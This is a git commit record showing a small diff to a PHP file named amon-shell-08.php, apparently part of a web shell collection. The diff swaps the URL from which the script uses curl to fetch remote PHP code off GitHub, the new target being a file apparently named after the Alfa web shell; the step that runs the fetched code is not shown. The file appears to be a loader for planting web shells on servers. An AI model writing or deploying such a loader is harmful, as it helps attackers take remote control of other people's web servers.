ea4ee71d47f10bb713d740ba41fbf1acf7294f2a
rendihidayat683 <rendihidayat683@gmail.com>
2025-10-27 04:24:11 +0700

    Update amon-shell-08.php

--- amon-shell-08.php
+++ amon-shell-08.php
@@ -1,5 +1,5 @@
 <?php
-$url = "https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/2025wp-inc-vn.php";
+$url = "https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/alfa_root.phpp";
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_HEADER, true);
